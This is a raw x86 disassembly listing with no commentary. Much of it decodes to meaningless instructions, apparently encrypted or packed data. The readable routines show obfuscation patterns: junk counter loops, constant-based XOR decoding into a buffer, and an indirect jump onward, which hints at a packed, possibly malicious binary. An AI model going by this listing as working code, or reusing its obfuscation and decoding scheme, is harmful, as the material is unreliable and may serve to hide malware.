  41080c:	xchg   esi,eax
  41080d:	push   ebx
  41080e:	jecxz  0x4107fe
  410810:	inc    ecx
  410811:	std    
  410812:	adc    ch,BYTE PTR [ebx]
  410814:	xchg   ebx,eax
  410815:	imul   ebp,DWORD PTR [ecx+eax*2],0x5e
  410819:	addr16 xchg edx,eax
  41081b:	add    BYTE PTR [edi-0x1ddff9de],bh
  410821:	sub    BYTE PTR [ebx],cl
  410823:	inc    bx
  410825:	lea    ecx,[esi+0x1cd7847f]
  41082b:	aad    0x78
  41082d:	in     al,0xee
  41082f:	mov    ds:0x640d870e,al
  410834:	jo     0x4107f3
  410836:	add    edx,DWORD PTR es:[edi+0x72]
  41083a:	cmp    bh,BYTE PTR [esi-0x22]
  41083d:	pop    eax
  41083e:	add    edx,DWORD PTR [ecx-0x6f]
  410841:	jmp    0x4108b3
  410843:	push   ds
  410844:	sbb    eax,esi
  410846:	int3   
  410847:	xchg   ecx,eax
  410848:	pop    ebx
  410849:	push   cs
  41084a:	call   0x3c51:0xd2a982f9
  410851:	icebp  
  410852:	inc    ebp
  410853:	cmp    ch,BYTE PTR [ecx+0x55dca2d]
  410859:	call   0x236de37
  41085e:	sub    bh,bl
  410860:	stc    
  410861:	and    BYTE PTR [edx],bh
  410863:	mov    cl,BYTE PTR [ecx+eiz*2+0x3d]
  410867:	int    0x12
  410869:	sub    eax,0x41996200
  41086e:	add    ebp,edx
  410870:	jbe    0x410825
  410872:	call   0x4eb8:0xef271ade
  410879:	sbb    dl,BYTE PTR [eax+0x47]
  41087c:	(bad)  
  41087e:	mov    edi,0x64aef6f7
  410883:	xchg   DWORD PTR [ebx],esp
  410885:	fld    TBYTE PTR [edi+0x42]
  410888:	and    al,0xe0
  41088a:	mov    ebp,ss
  41088c:	jmp    0x541f9546
  410891:	sbb    al,0xd8
  410893:	call   0x293:0xab72f1ec
  41089a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41089b:	pop    esp
  41089c:	sbb    DWORD PTR [edx+0x6],eax
  41089f:	(bad)  
  4108a0:	pop    ebp
  4108a1:	xchg   DWORD PTR [esi-0xc2d2cab],ecx
  4108a7:	hlt    
  4108a8:	mov    edx,0xfa82875c
  4108ad:	cld    
  4108ae:	mov    ebx,0x61d734c0
  4108b3:	inc    eax
  4108b4:	push   ebp
  4108b5:	inc    edi
  4108b6:	and    ebp,esi
  4108b8:	movsx  edi,al
  4108bb:	inc    edx
  4108bc:	push   ebx
  4108bd:	lods   al,BYTE PTR ds:[esi]
  4108be:	xchg   ecx,eax
  4108bf:	pop    ss
  4108c0:	xchg   esi,eax
  4108c1:	or     edx,ebp
  4108c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108c4:	mov    DWORD PTR [ebp+0x487636da],ecx
  4108ca:	ds loop 0x4108ba
  4108cd:	mov    ah,0x95
  4108cf:	pop    eax
  4108d0:	fcom   QWORD PTR [edx-0x3f6059fc]
  4108d6:	pop    eax
  4108d7:	dec    ebx
  4108d8:	adc    eax,0x1cf2ac13
  4108dd:	and    al,0x72
  4108df:	add    DWORD PTR [ebx],esi
  4108e1:	xchg   ecx,eax
  4108e2:	psubsw mm1,QWORD PTR [ebp+0x74]
  4108e6:	enter  0x592b,0xbb
  4108ea:	mov    DWORD PTR [ebp-0x7a03bfe3],esp
  4108f0:	test   DWORD PTR [ebx+0x74],0x46755ab
  4108f7:	push   ss
  4108f8:	mov    WORD PTR [esi+0x6d],gs
  4108fb:	retf   
  4108fc:	lea    esp,[ebx-0x60]
  4108ff:	xchg   ecx,eax
  410900:	loop   0x41088b
  410902:	repz add DWORD PTR [eax-0x286ba999],esp
  410909:	add    BYTE PTR [ebp+0x3d1e6be4],ah
  41090f:	jbe    0x410919
  410911:	jae    0x41090c
  410913:	jecxz  0x410950
  410915:	rol    dh,1
  410917:	pop    edi
  410918:	pop    edx
  410919:	ret    
  41091a:	xor    ebp,DWORD PTR [eax+0x5f4224fc]
  410920:	in     al,dx
  410921:	fimul  WORD PTR [ebx+edi*1]
  410924:	mov    cl,0xb0
  410926:	std    
  410927:	mov    ch,0x5a
  410929:	and    BYTE PTR [edi],bl
  41092b:	jb     0x4108bc
  41092d:	add    BYTE PTR [ebx],ah
  41092f:	inc    ecx
  410930:	daa    
  410931:	jb     0x41095e
  410933:	xchg   edx,eax
  410934:	dec    ecx
  410935:	xor    edi,DWORD PTR [ecx]
  410937:	inc    ebx
  410938:	ror    DWORD PTR [ebp+0x76741e08],1
  41093e:	cld    
  41093f:	imul   ebp,DWORD PTR [ecx-0x5db9c010],0xb3188c9f
  410949:	sti    
  41094a:	fcom   QWORD PTR [ebx]
  41094c:	(bad)  
  41094d:	fcomip st,st(3)
  41094f:	cmp    eax,0x8567e828
  410954:	inc    esi
  410955:	pop    ebp
  410956:	fisubr DWORD PTR [esi]
  410958:	and    edx,DWORD PTR [esi+ebp*8-0x58572b1c]
  41095f:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410961:	fs cmc 
  410963:	sbb    eax,0x161f955d
  410968:	cmp    eax,0xff405a79
  41096d:	cwde   
  41096e:	cmp    al,BYTE PTR [eax-0x42710773]
  410974:	ja     0x4109ad
  410976:	push   esi
  410977:	xchg   DWORD PTR [esi],ebx
  410979:	fsub   st(4),st
  41097b:	jnp    0x410955
  41097d:	inc    edx
  41097e:	mov    esi,0x20caa046
  410983:	inc    esi
  410984:	xor    esi,DWORD PTR [ebx]
  410986:	div    BYTE PTR [esi-0x697cb46b]
  41098c:	outs   dx,DWORD PTR ds:[esi]
  41098d:	push   eax
  41098e:	cld    
  41098f:	push   edx
  410990:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410991:	adc    esi,DWORD PTR ds:0x61d5fa0b
  410997:	add    BYTE PTR [ebx-0x7d219a7c],cl
  41099d:	mov    eax,0xa761ba7b
  4109a2:	pop    edi
  4109a3:	lds    eax,FWORD PTR [edx+0x3cd0e3ad]
  4109a9:	adc    al,0x35
  4109ab:	dec    esi
  4109ac:	scas   al,BYTE PTR es:[edi]
  4109ad:	cmp    cl,BYTE PTR [ecx]
  4109af:	shr    dl,0x93
  4109b2:	mov    bh,0x22
  4109b4:	in     eax,0x69
  4109b6:	inc    ebp
  4109b7:	sar    BYTE PTR [esi-0x4e26c3d3],cl
  4109bd:	(bad)
  4109c0:	push   ecx
  4109c1:	mov    BYTE PTR ds:0xc94a910b,bl
  4109c7:	cld    
  4109c8:	inc    edx
  4109c9:	mov    ch,0x6d
  4109cb:	lods   al,BYTE PTR ds:[esi]
  4109cc:	rcl    BYTE PTR [esi+0x890c1cc],cl
  4109d2:	pop    es
  4109d3:	mov    eax,0x461edaca
  4109d8:	cmp    cx,dx
  4109db:	jne    0x40e62e
  4109e1:	mov    ecx,DWORD PTR ds:0x424435
  4109e7:	mov    ecx,DWORD PTR [ecx+0x198]
  4109ed:	mov    DWORD PTR [ecx],eax
  4109ef:	jmp    0x410a15
  4109f4:	mov    ecx,DWORD PTR [ebp+0x18]
  4109f7:	cmp    ecx,0xf89c85b2
  4109fd:	jne    0x410a15
  410a03:	push   eax
  410a04:	push   DWORD PTR [ebp+0x14]
  410a07:	push   DWORD PTR [ebp+0x10]
  410a0a:	push   DWORD PTR [ebp+0xc]
  410a0d:	push   DWORD PTR [ebp+0x8]
  410a10:	call   0x40772b
  410a15:	pop    edi
  410a16:	pop    esi
  410a17:	leave  
  410a18:	ret    0x14
  410a1b:	push   ebp
  410a1c:	mov    ebp,esp
  410a1e:	push   ecx
  410a1f:	and    DWORD PTR ds:0x422004,0x0
  410a29:	jmp    0x410a3b
  410a2e:	mov    edx,DWORD PTR ds:0x422004
  410a34:	inc    edx
  410a35:	mov    DWORD PTR ds:0x422004,edx
  410a3b:	cmp    DWORD PTR ds:0x422004,0x13
  410a42:	jae    0x410a8f
  410a48:	cmp    DWORD PTR ds:0x422004,0xb
  410a4f:	jne    0x410a68
  410a55:	push   DWORD PTR [ebp-0xc]
  410a58:	push   0x42201c
  410a5d:	push   0x5e67
  410a62:	call   DWORD PTR ds:0x4247d9
  410a68:	cmp    DWORD PTR ds:0x422004,0xa
  410a6f:	jne    0x410a84
  410a75:	xor    edx,edx
  410a77:	add    edx,DWORD PTR ds:0x422004
  410a7d:	inc    edx
  410a7e:	mov    DWORD PTR ds:0x422004,edx
  410a84:	jmp    0x410a2e
  410a89:	xor    edx,DWORD PTR ds:0x420ef4
  410a8f:	push   ecx
  410a90:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  410a97:	xor    eax,eax
  410a99:	xor    eax,DWORD PTR ds:0x420f9c
  410a9f:	adc    DWORD PTR ds:0x420fb4,eax
  410aa5:	mov    DWORD PTR [ebp-0x4],0xf89c85b2
  410aac:	neg    eax
  410aae:	mov    eax,DWORD PTR [ebp-0x4]
  410ab1:	mov    ecx,DWORD PTR ds:0x420fa0
  410ab7:	adc    DWORD PTR ds:0x420e7e,ecx
  410abd:	push   esi
  410abe:	mov    esi,DWORD PTR [ebp-0x8]
  410ac1:	mov    edx,DWORD PTR ds:0x420f44
  410ac7:	mov    ecx,DWORD PTR ds:0x423010
  410acd:	sub    ecx,edx
  410acf:	xor    edx,DWORD PTR [edx+ecx*1]
  410ad2:	mov    edx,0x7510896
  410ad7:	mov    DWORD PTR ds:0x420fa4,0x1c
  410ae1:	cmp    DWORD PTR ds:0x420fa4,0x0
  410ae8:	je     0x410b1f
  410aee:	cmp    DWORD PTR ds:0x420fa4,0x1e
  410af5:	jne    0x410b0b
  410afb:	push   0x424143
  410b00:	push   0x4240f3
  410b05:	call   DWORD PTR ds:0x4247dd
  410b0b:	xor    ecx,ecx
  410b0d:	or     ecx,DWORD PTR ds:0x420fa4
  410b13:	dec    ecx
  410b14:	mov    DWORD PTR ds:0x420fa4,ecx
  410b1a:	jmp    0x410ae1
  410b1f:	xor    eax,edx
  410b21:	xor    esi,edx
  410b23:	mov    ecx,0x3272dd
  410b28:	add    esi,ecx
  410b2a:	add    eax,ecx
  410b2c:	imul   eax,esi
  410b2f:	mov    esi,DWORD PTR [ebp+0xc]
  410b32:	cmp    esi,eax
  410b34:	jne    0x410b50
  410b3a:	mov    eax,DWORD PTR [ebp-0x4]
  410b3d:	mov    esi,DWORD PTR [ebp-0x8]
  410b40:	xor    eax,edx
  410b42:	xor    esi,edx
  410b44:	add    eax,ecx
  410b46:	add    esi,ecx
  410b48:	imul   eax,esi
  410b4b:	jmp    0x410b8b
  410b50:	mov    eax,DWORD PTR [ebp+0xc]
  410b53:	mov    eax,DWORD PTR [eax+0x78]
  410b56:	mov    DWORD PTR [ebp+0xc],eax
  410b59:	mov    eax,DWORD PTR [ebp-0x4]
  410b5c:	mov    esi,DWORD PTR [ebp-0x8]
  410b5f:	xor    eax,edx
  410b61:	xor    esi,edx
  410b63:	add    eax,ecx
  410b65:	add    esi,ecx
  410b67:	imul   eax,esi
  410b6a:	mov    esi,DWORD PTR [ebp+0xc]
  410b6d:	cmp    esi,eax
  410b6f:	mov    eax,DWORD PTR [ebp-0x4]
  410b72:	je     0x410b3d
  410b78:	xor    eax,edx
  410b7a:	add    eax,ecx
  410b7c:	mov    ecx,DWORD PTR [ebp+0xc]
  410b7f:	imul   eax,ecx
  410b82:	add    eax,DWORD PTR [ebp+0x8]
  410b85:	mov    DWORD PTR [ebp+0xc],eax
  410b88:	mov    eax,DWORD PTR [ebp+0xc]
  410b8b:	pop    esi
  410b8c:	leave  
  410b8d:	ret    0x8
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	push   ecx
  410b94:	and    DWORD PTR ds:0x420ef0,0x0
  410b9e:	mov    eax,ds:0x420ef0
  410ba3:	inc    eax
  410ba4:	mov    ds:0x420ef0,eax
  410ba9:	cmp    DWORD PTR ds:0x420ef0,0x6
  410bb0:	jne    0x410bc7
  410bb6:	push   0x613e
  410bbb:	push   DWORD PTR [ebp-0xc]
  410bbe:	push   DWORD PTR [ebp-0x10]
  410bc1:	call   DWORD PTR ds:0x4247e1
  410bc7:	cmp    DWORD PTR ds:0x420ef0,0x5
  410bce:	jne    0x410be2
  410bd4:	xor    eax,eax
  410bd6:	or     eax,DWORD PTR ds:0x420ef0
  410bdc:	inc    eax
  410bdd:	mov    ds:0x420ef0,eax
  410be2:	cmp    DWORD PTR ds:0x420ef0,0x1b
  410be9:	jb     0x410b9e
  410bef:	or     DWORD PTR ds:0x420e8e,0x6d67
  410bf9:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  410c00:	mov    eax,DWORD PTR [ebp-0x4]
  410c03:	mov    ecx,DWORD PTR ds:0x420f08
  410c09:	sbb    ecx,DWORD PTR ds:0x420ef4
  410c0f:	mov    DWORD PTR ds:0x420f08,ecx
  410c15:	mov    edx,DWORD PTR [ebp+0x10]
  410c18:	mov    ecx,DWORD PTR ds:0x42201c
  410c1e:	sub    DWORD PTR ds:0x42200c,ecx
  410c24:	mov    ecx,0x7510896
  410c29:	xor    eax,ecx
  410c2b:	add    eax,0x3272dd
  410c30:	mov    DWORD PTR [edx],eax
  410c32:	mov    eax,DWORD PTR [ebp+0xc]
  410c35:	xor    eax,ecx
  410c37:	push   esi
  410c38:	mov    esi,DWORD PTR [ebp+0x10]
  410c3b:	mov    edx,0x3272dd
  410c40:	add    eax,edx
  410c42:	mov    DWORD PTR [esi+0x4],eax
  410c45:	mov    eax,DWORD PTR [ebp+0x14]
  410c48:	mov    esi,DWORD PTR [ebp+0x10]
  410c4b:	mov    DWORD PTR [esi+0x8],eax
  410c4e:	mov    eax,DWORD PTR [ebp+0x18]
  410c51:	mov    esi,DWORD PTR [ebp+0x10]
  410c54:	mov    DWORD PTR [esi+0xc],eax
  410c57:	mov    eax,DWORD PTR [ebp+0x1c]
  410c5a:	mov    esi,DWORD PTR [ebp+0x10]
  410c5d:	mov    DWORD PTR [esi+0x10],eax
  410c60:	mov    eax,DWORD PTR [ebp+0x8]
  410c63:	xor    eax,ecx
  410c65:	add    eax,edx
  410c67:	pop    esi
  410c68:	leave  
  410c69:	ret    0x18
  410c6c:	push   ebp
  410c6d:	mov    ebp,esp
  410c6f:	sub    esp,0xa4
  410c75:	or     eax,eax
  410c77:	mov    ecx,DWORD PTR [ebp+0x8]
  410c7a:	mov    eax,0x8a89
  410c7f:	xor    ax,WORD PTR [ecx+0x20]
  410c83:	mov    ecx,0x3b4c
  410c88:	and    DWORD PTR ds:0x420fac,0x1c5
  410c92:	add    ax,cx
  410c95:	movzx  eax,ax
  410c98:	and    DWORD PTR ds:0x420e8a,0x0
  410ca2:	mov    ecx,DWORD PTR ds:0x420e8a
  410ca8:	inc    ecx
  410ca9:	mov    DWORD PTR ds:0x420e8a,ecx
  410caf:	cmp    DWORD PTR ds:0x420e8a,0x9
  410cb6:	jne    0x410ccd
  410cbc:	push   DWORD PTR [ebp-0x20]
  410cbf:	push   0x420f08
  410cc4:	push   DWORD PTR [ebp-0x10]
  410cc7:	call   DWORD PTR ds:0x4247e5
  410ccd:	cmp    DWORD PTR ds:0x420e8a,0x8
  410cd4:	jne    0x410ce9
  410cda:	xor    ecx,ecx
  410cdc:	add    ecx,DWORD PTR ds:0x420e8a
  410ce2:	inc    ecx
  410ce3:	mov    DWORD PTR ds:0x420e8a,ecx
  410ce9:	cmp    DWORD PTR ds:0x420e8a,0x16
  410cf0:	jb     0x410ca2
  410cf6:	mov    DWORD PTR [ebp-0x18],eax
  410cf9:	mov    BYTE PTR [ebp-0x1],0x7d
  410cfd:	sub    ecx,DWORD PTR ds:0x420e9a
  410d03:	lea    eax,[ebp-0x1]
  410d06:	and    DWORD PTR ds:0x420e82,0x0
  410d10:	xor    ecx,ecx
  410d12:	or     ecx,DWORD PTR ds:0x420e82
  410d18:	inc    ecx
  410d19:	mov    DWORD PTR ds:0x420e82,ecx
  410d1f:	cmp    DWORD PTR ds:0x420e82,0x14
  410d26:	jne    0x410d32
  410d2c:	call   DWORD PTR ds:0x4247f1
  410d32:	cmp    DWORD PTR ds:0x420e82,0x11
  410d39:	jb     0x410d10
  410d3f:	mov    DWORD PTR [ebp-0x10],eax
  410d42:	or     DWORD PTR ds:0x420fa8,edx
  410d48:	mov    al,BYTE PTR [ebp-0x1]
  410d4b:	sub    DWORD PTR ds:0x422008,ebx
  410d51:	mov    ecx,DWORD PTR [ebp-0x10]
  410d54:	xor    al,0x71
  410d56:	sbb    DWORD PTR ds:0x420fb0,0x420f04
  410d60:	sub    al,0xb
  410d62:	add    DWORD PTR ds:0x420f00,0x7fa5
  410d6c:	mov    BYTE PTR [ecx],al
  410d6e:	sbb    ecx,0xfb
  410d74:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  410d7b:	neg    eax
  410d7d:	push   ebx
  410d7e:	and    DWORD PTR ds:0x420f68,ebx
  410d84:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  410d8b:	not    ecx
  410d8d:	mov    ecx,DWORD PTR [ebp-0x14]
  410d90:	and    DWORD PTR ds:0x420ef8,0x0
  410d9a:	mov    eax,ds:0x420ef8
  410d9f:	inc    eax
  410da0:	mov    ds:0x420ef8,eax
  410da5:	cmp    DWORD PTR ds:0x420ef8,0xd
  410dac:	jne    0x410db8
  410db2:	call   DWORD PTR ds:0x4247f5
  410db8:	cmp    DWORD PTR ds:0x420ef8,0xc
  410dbf:	jne    0x410dd0
  410dc5:	mov    eax,ds:0x420ef8
  410dca:	inc    eax
  410dcb:	mov    ds:0x420ef8,eax
  410dd0:	cmp    DWORD PTR ds:0x420ef8,0x1f
  410dd7:	jb     0x410d9a
  410ddd:	or     DWORD PTR ds:0x420fa4,edx
  410de3:	push   esi
  410de4:	mov    eax,0x7510896
  410de9:	xor    ecx,eax
  410deb:	and    DWORD PTR ds:0x420fb0,0x0
  410df5:	jmp    0x410e07
  410dfa:	mov    esi,DWORD PTR ds:0x420fb0
  410e00:	inc    esi
  410e01:	mov    DWORD PTR ds:0x420fb0,esi
  410e07:	cmp    DWORD PTR ds:0x420fb0,0x16
  410e0e:	jae    0x410e4f
  410e14:	cmp    DWORD PTR ds:0x420fb0,0x26
  410e1b:	jne    0x410e44
  410e21:	push   0x2107
  410e26:	push   DWORD PTR [ebp-0xc]
  410e29:	push   0x420ea2
  410e2e:	push   DWORD PTR [ebp-0xc]
  410e31:	push   0x1296
  410e36:	push   0x8533
  410e3b:	push   DWORD PTR [ebp-0x24]
  410e3e:	call   DWORD PTR ds:0x4247f9
  410e44:	jmp    0x410dfa
  410e49:	xor    esi,0x6f84
  410e4f:	mov    esi,0x3272dd
  410e54:	push   edi
  410e55:	adc    DWORD PTR ds:0x422000,0x420fb0
  410e5f:	add    ecx,esi
  410e61:	jmp    0x410e7b
  410e66:	mov    DWORD PTR ds:0x422018,0x61e6
  410e70:	mov    dl,BYTE PTR [ebp-0x1]
  410e73:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  410e7a:	inc    ecx
  410e7b:	mov    DWORD PTR ds:0x420fa8,0x4793
  410e85:	cmp    ecx,0x40
  410e88:	mov    DWORD PTR ds:0x420f98,0x2ddc
  410e92:	jb     0x410e66
  410e98:	mov    edx,DWORD PTR ds:0x420e7a
  410e9e:	adc    DWORD PTR ds:0x420f58,edx
  410ea4:	mov    edx,DWORD PTR [ebp-0x14]
  410ea7:	add    DWORD PTR ds:0x420f9c,0x420e8e
  410eb1:	xor    edx,eax
  410eb3:	or     DWORD PTR ds:0x420e9e,0x6c51
  410ebd:	add    edx,esi
  410ebf:	mov    DWORD PTR ds:0x420f98,0x212f
  410ec9:	jmp    0x410f67
  410ece:	mov    ecx,DWORD PTR ds:0x420f58
  410ed4:	adc    ecx,DWORD PTR ds:0x420ef8
  410eda:	mov    DWORD PTR ds:0x420f58,ecx
  410ee0:	mov    edi,DWORD PTR [ebp+0x8]
  410ee3:	neg    ecx
  410ee5:	mov    ecx,0x8a89
  410eea:	mov    DWORD PTR ds:0x422010,0x1e03
  410ef4:	xor    cx,WORD PTR [edi+edx*4+0x2]
  410ef9:	xor    DWORD PTR ds:0x420efc,0x6f5f
  410f03:	mov    edi,0x3b4c
  410f08:	sbb    DWORD PTR ds:0x420f9c,0x63db
  410f12:	add    cx,di
  410f15:	add    DWORD PTR ds:0x42201c,0x420fa0
  410f1f:	movzx  ecx,cx
  410f22:	sub    DWORD PTR ds:0x420f08,0x420f5c
  410f2c:	mov    DWORD PTR [ebp-0x10],ecx
  410f2f:	mov    ecx,DWORD PTR [ebp+0x8]
  410f32:	add    DWORD PTR ds:0x422004,0x422010
  410f3c:	movzx  ecx,WORD PTR [ecx+edx*4]
  410f40:	xor    ecx,0x8a89
  410f46:	and    DWORD PTR ds:0x420ef8,0x48dd
  410f50:	add    ecx,edi
  410f52:	mov    edi,DWORD PTR [ebp-0x10]
  410f55:	mov    DWORD PTR ds:0x420fb4,0x2f78
  410f5f:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  410f66:	inc    edx
  410f67:	mov    DWORD PTR ds:0x420e7a,edx
  410f6d:	mov    ecx,DWORD PTR [ebp-0x18]
  410f70:	mov    DWORD PTR ds:0x420f08,0x1ffa
  410f7a:	cmp    edx,ecx
  410f7c:	mov    DWORD PTR ds:0x420efc,0x1e95
  410f86:	jne    0x410ece
  410f8c:	mov    ecx,DWORD PTR [ebp-0x14]
  410f8f:	add    edx,0x1ead
  410f95:	mov    edx,DWORD PTR [ebp+0x10]
  410f98:	sbb    DWORD PTR ds:0x422008,0x2f5c
  410fa2:	xor    ecx,eax
  410fa4:	and    DWORD PTR ds:0x422018,0x2dc0
  410fae:	add    ecx,esi
  410fb0:	jmp    0x41333d
  410fb5:	lods   eax,DWORD PTR ds:[esi]
  410fb6:	mov    ecx,0xd4095449
  410fbb:	jae    0x411038
  410fbd:	sbb    BYTE PTR [ebx+0x1e57629f],0xbe
  410fc4:	aam    0x2e
  410fc6:	scas   al,BYTE PTR es:[edi]
  410fc7:	jp     0x411043
  410fc9:	or     bl,BYTE PTR [edi+0x7a]
  410fcc:	jp     0x41103b
  410fce:	mov    esi,DWORD PTR [edi]
  410fd0:	lar    eax,WORD PTR [ebx+0x3ea405f0]
  410fd7:	mov    esi,0x251a1bbd
  410fdc:	adc    bh,BYTE PTR [eax+0x78]
  410fdf:	clc    
  410fe0:	jno    0x410fd1
  410fe2:	in     al,dx
  410fe3:	mov    esi,0xd3817bcf
  410fe8:	aad    0xa4
  410fea:	shl    BYTE PTR [edx-0x4cf2e87b],1
  410ff0:	sahf   
  410ff1:	jmp    FWORD PTR [ecx+0x69]
  410ff4:	or     DWORD PTR [ecx],0x4c4b8175
  410ffa:	xchg   ebp,eax
  410ffb:	add    ebp,DWORD PTR [ebp+0x57999955]
  411001:	inc    edx
  411002:	cmp    eax,0x5e69b73b
  411007:	push   es
  411008:	dec    ebx
  411009:	ds xchg ebx,eax
  41100b:	and    al,0xc0
  41100d:	mov    eax,ds:0x129f43db
  411012:	inc    eax
  411013:	pop    ds
  411014:	mov    DWORD PTR [ebx-0x1b],esp
  411017:	mov    bh,0x74
  411019:	out    0x8e,eax
  41101b:	(bad)  
  41101c:	mov    eax,0xd71c7abe
  411021:	push   edx
  411022:	aas    
  411023:	mov    edi,0xa82b9f89
  411028:	sahf   
  411029:	pop    ecx
  41102a:	bound  edx,QWORD PTR [ebx+edx*2-0xea87a02]
  411031:	loope  0x411039
  411033:	pop    ds
  411034:	test   edx,ecx
  411036:	inc    edx
  411037:	sub    edi,edi
  411039:	push   edx
  41103a:	cmp    DWORD PTR [ebx],edi
  41103c:	and    al,0xc2
  41103e:	jns    0x4110af
  411040:	lods   eax,DWORD PTR ds:[esi]
  411041:	test   BYTE PTR [edx+0x690f3c8a],dl
  411047:	ins    DWORD PTR es:[edi],dx
  411048:	sar    DWORD PTR [esp+ebp*8],cl
  41104b:	(bad)  
  41104c:	iret   
  41104d:	nop
  41104e:	out    0x9d,al
  411050:	icebp  
  411051:	ret    0x6fd1
  411054:	(bad)  
  411055:	add    eax,ebx
  411057:	xor    DWORD PTR [edx],0x4c
  41105a:	imul   ecx,DWORD PTR [edi],0xa025fe41
  411060:	(bad)  
  411061:	xchg   ebx,eax
  411062:	xor    BYTE PTR [edi+ecx*1+0x6e],dh
  411066:	shl    DWORD PTR [ebx+0x73],0x5c
  41106a:	mov    eax,ds:0x3a7f1a98
  41106f:	add    dh,0x2
  411072:	and    BYTE PTR [ebx+0xb],bl
  411075:	rol    DWORD PTR [edx-0x92b3244],cl
  41107b:	inc    esi
  41107c:	out    dx,al
  41107d:	cmc    
  41107e:	or     BYTE PTR [edi+eiz*8+0x298f0fde],cl
  411085:	sbb    dl,BYTE PTR [esi]
  411087:	hlt    
  411088:	pop    ss
  411089:	stos   BYTE PTR es:[edi],al
  41108a:	and    DWORD PTR [ebx+edi*2],esi
  41108d:	xchg   edx,ebx
  41108f:	ins    BYTE PTR es:[edi],dx
  411090:	jmp    0xa2a42744
  411095:	push   0xfcdd8221
  41109a:	cmp    al,0x17
  41109c:	xchg   DWORD PTR [esi-0x27],esi
  41109f:	jge    0x41111e
  4110a1:	and    BYTE PTR [edi],dl
  4110a3:	adc    esi,DWORD PTR [eax-0x394580d]
  4110a9:	std    
  4110aa:	xchg   esi,eax
  4110ab:	jecxz  0x4110cf
  4110ad:	(bad)  
  4110ae:	daa    
  4110af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110b0:	adc    al,0x43
  4110b2:	mov    edi,DWORD PTR [ebx+ebp*4+0x5a75cc03]
  4110b9:	fsubp  st(1),st
  4110bb:	enter  0x7e86,0x1
  4110bf:	(bad)  
  4110c1:	sub    ebp,esp
  4110c3:	not    DWORD PTR [eax]
  4110c5:	mov    al,ds:0xf9fb21ed
  4110ca:	add    ebx,0x19
  4110cd:	test   esp,ecx
  4110cf:	clc    
  4110d0:	push   cs
  4110d1:	aas    
  4110d2:	inc    ebp
  4110d3:	iret   
  4110d4:	xchg   esi,eax
  4110d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110d6:	enter  0x9cf0,0x6f
  4110da:	and    eax,0xec6b91a6
  4110df:	or     eax,0x45b14f17
  4110e4:	jne    0x411099
  4110e6:	sbb    esi,ebp
  4110e8:	daa    
  4110e9:	cwde   
  4110ea:	jle    0x4110b3
  4110ec:	jbe    0x4110b3
  4110ee:	aam    0xdc
  4110f0:	and    esp,ebp
  4110f2:	mov    bl,0xa8
  4110f4:	loope  0x4110e4
  4110f6:	mov    al,ds:0x769e8e8d
  4110fb:	lods   eax,DWORD PTR ds:[esi]
  4110fc:	cmp    cl,dl
  4110fe:	je     0x411094
  411100:	cmp    ebp,eax
  411102:	rcl    DWORD PTR [eax],1
  411104:	push   ecx
  411105:	mov    ecx,0xc3f701cd
  41110a:	popa   
  41110b:	lods   eax,DWORD PTR ds:[esi]
  41110c:	nop
  41110d:	test   BYTE PTR [esi-0x5a],cl
  411110:	xchg   edi,eax
  411111:	clc    
  411112:	jle    0x41117b
  411114:	ja     0x4110f7
  411116:	mov    eax,0x432e5113
  41111b:	or     al,0x75
  41111d:	mov    BYTE PTR [edi],0x1a
  411120:	push   ds
  411121:	sar    DWORD PTR [ecx],cl
  411123:	or     ah,bh
  411125:	cmp    cl,BYTE PTR [ebx-0x642808e]
  41112b:	adc    DWORD PTR [ebp-0x2c],esp
  41112e:	nop
  41112f:	icebp  
  411130:	inc    edx
  411131:	nop
  411132:	aad    0x4c
  411134:	pusha  
  411135:	inc    ebx
  411136:	sub    al,0x1a
  411138:	dec    edx
  411139:	pop    esp
  41113a:	ret    
  41113b:	sub    eax,0x2349f3cb
  411140:	xor    BYTE PTR [edx-0xe],bl
  411143:	pop    esp
  411144:	jbe    0x411156
  411146:	xchg   BYTE PTR [ebp+ecx*4+0x81fea19],bl
  41114d:	cmp    DWORD PTR [edi-0x35a8ca3a],ebx
  411153:	cld    
  411154:	sub    BYTE PTR ss:[edx+0x32e4789f],ah
  41115b:	or     al,0xdc
  41115d:	inc    edi
  41115e:	out    0xbe,eax
  411160:	push   ebp
  411161:	ror    BYTE PTR [eax+0x3fbb07cf],cl
  411167:	sub    DWORD PTR [edi+edi*8-0x6a],edi
  41116b:	sbb    BYTE PTR [edx+0x1e6ef7f0],cl
  411171:	pop    esp
  411172:	jmp    0x23c1:0x9f218047
  411179:	and    al,0x2e
  41117b:	inc    ebx
  41117c:	mov    dl,0xb3
  41117e:	ret    0xfeab
  411181:	push   edx
  411182:	push   es
  411183:	push   0xffffffbf
  411185:	mov    ah,0xd6
  411187:	frstor [esi-0x4b]
  41118a:	popa   
  41118b:	and    BYTE PTR [ebx+0x5b7be835],bh
  411191:	mov    ebp,0x9fb11ef2
  411196:	add    dh,BYTE PTR [eax-0x47]
  411199:	add    eax,0x734776eb
  41119e:	inc    ecx
  41119f:	xchg   edi,eax
  4111a0:	retf   
  4111a1:	add    ch,BYTE PTR [edx]
  4111a3:	mov    dl,0x39
  4111a5:	cli    
  4111a6:	xchg   ebp,eax
  4111a7:	jecxz  0x41119e
  4111a9:	cli    
  4111aa:	lods   al,BYTE PTR ds:[esi]
  4111ab:	cmp    BYTE PTR es:[esi-0x5a95722d],al
  4111b2:	mov    esp,0x73bbbe2d
  4111b7:	mov    eax,0x16c7be88
  4111bc:	out    0x5f,al
  4111be:	fild   WORD PTR [eax+ebp*8-0x551dba18]
  4111c5:	push   ds
  4111c6:	jnp    0x411222
  4111c8:	popa   
  4111c9:	jae    0x411239
  4111cb:	add    esi,edi
  4111cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111ce:	xchg   esi,eax
  4111cf:	lea    edi,[edi]
  4111d1:	or     eax,0x809eef52
  4111d6:	xchg   BYTE PTR [bp+si+0x4647],ah
  4111db:	inc    ecx
